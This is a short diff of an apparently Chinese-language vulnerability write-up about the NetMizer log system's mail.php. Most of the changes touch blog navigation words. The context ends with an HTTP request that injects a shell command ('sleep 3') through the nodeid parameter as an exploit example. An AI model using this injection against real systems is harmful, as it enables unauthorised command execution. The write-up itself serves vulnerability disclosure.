@@ -22,14 +22,6 @@ NetMizer日志[管理系统](#)是一款专为网络流量管理和优化设计�
 
 看下 `mail.php` 业务实现关键逻辑部分
 
-深入探索
-
-博客资源与服务
-
-Blog
-
-数学
-
 ```
 <?php
         include('../include/JSON.php');
@@ -201,7 +193,7 @@ Blog
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
 
-字典与百科全书
+工程与技术
 
 ```
 GET /data/search/mail.php?action=file&nodeid=1;sleep+3 HTTP/1.1
